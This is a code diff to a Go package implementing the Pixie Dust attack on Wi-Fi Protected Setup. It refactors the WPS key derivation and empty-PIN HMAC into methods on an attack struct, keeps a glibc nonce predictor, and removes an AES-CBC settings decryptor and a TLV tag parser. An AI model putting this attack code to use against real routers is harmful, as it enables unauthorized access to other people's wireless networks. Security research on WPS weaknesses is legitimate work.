@@ -19,8 +19,6 @@ package pixiedust
 
 import (
 	"bytes"
-	"crypto/aes"
-	"crypto/cipher"
 	"crypto/hmac"
 	"crypto/sha256"
 	"encoding/binary"
@@ -52,6 +50,10 @@ type pixieDustAttack struct {
 	end      string
 	cStart   int
 	cEnd     int
+    emsk     []byte
+    wrapKey  []byte
+    eSecret1 []byte
+    eSecret2 []byte
 }
 
 
@@ -116,7 +118,7 @@ func cryptoModExp(base, power, modulus []byte) ([]byte, error) {
 
 
 
-func keyDerivationFunction(key []byte) (authKey, wrapKey, emsk []byte) {
+func (pda *pixieDustAttack) keyDerivationFunction(key []byte) {
 	var kdfSalt  = []byte("Wi-Fi Easy and Secure Key Derivation")
     totalLen    := wpsAuthkeyLen + wpsKeywrapkeyLen + wpsEmskLen // 80 bytes
     kdkBits     := uint32(totalLen * 8)  // 640 bits
@@ -132,22 +134,20 @@ func keyDerivationFunction(key []byte) (authKey, wrapKey, emsk []byte) {
 
     out = out[:totalLen]
 	
-	offset  := 0
-    authKey  = out[:wpsAuthkeyLen]
+	offset      := 0
+    pda.authKey  = out[:wpsAuthkeyLen]
 	
-	offset  += wpsAuthkeyLen
-    wrapKey  = out[offset : offset + wpsKeywrapkeyLen]
+	offset      += wpsAuthkeyLen
+    pda.wrapKey  = out[offset : offset + wpsKeywrapkeyLen]
 	
 	offset  += wpsKeywrapkeyLen
-    emsk     = out[offset:]
-    
-	return
+    pda.emsk = out[offset:]
 }
 
 
 
-func emptyPinHMAC(authkey []byte) []byte {
-    h := hmac.New(sha256.New, authkey)
+func (pda *pixieDustAttack) emptyPinHMAC() []byte {
+    h := hmac.New(sha256.New, pda.authKey)
     return h.Sum(nil)
 }
 
@@ -197,67 +197,6 @@ func glibcFastNonce(seed uint32) []byte {
     binary.BigEndian.PutUint32(nonce[12:16], word3>>1)
     
 	return nonce
-}
-
-
-
-func decryptEncryptedSettings(wrapKey, encr []byte) ([]byte, error) {
-    const blockSize = 16
-    if len(encr) < 2*blockSize || len(encr)%blockSize != 0 {
-        return nil, errors.New("invalid encrypted data length")
-    }
-
-    iv         := encr[:blockSize]
-    ciphertext := encr[blockSize:]
-
-    block, err := aes.NewCipher(wrapKey)
-    if err != nil {
-        return nil, err
-    }
-
-    mode      := cipher.NewCBCDecrypter(block, iv)
-    plaintext := make([]byte, len(ciphertext))
-    mode.CryptBlocks(plaintext, ciphertext)
-
-    padLen := int(plaintext[len(plaintext)-1])
-    if padLen == 0 || padLen > len(plaintext) {
-        return nil, errors.New("invalid padding")
-    }
-
-    for i := len(plaintext) - padLen; i < len(plaintext); i++ {
-        if plaintext[i] != byte(padLen) {
-            return nil, errors.New("invalid padding")
-        }
-    }
-
-    return plaintext[:len(plaintext)-padLen], nil
-}
-
-
-
-type IEVTag struct {
-    ID   uint16
-    Len  uint16
-    Data []byte
-}
-
-func findVTag(data []byte, targetID uint16, targetLen int) *IEVTag {
-    for i := 0; i+4 <= len(data); {
-        id := binary.BigEndian.Uint16(data[i : i+2])
-        length := int(binary.BigEndian.Uint16(data[i+2 : i+4]))
-        if i+4+length > len(data) {
-            return nil
-        }
-        if id == targetID && (targetLen == 0 || length == targetLen) {
-            return &IEVTag{
-                ID:   id,
-                Len:  uint16(length),
-                Data: data[i+4 : i+4+length],
-            }
-        }
-        i += 4 + length
-    }
-    return nil
 }
 
 
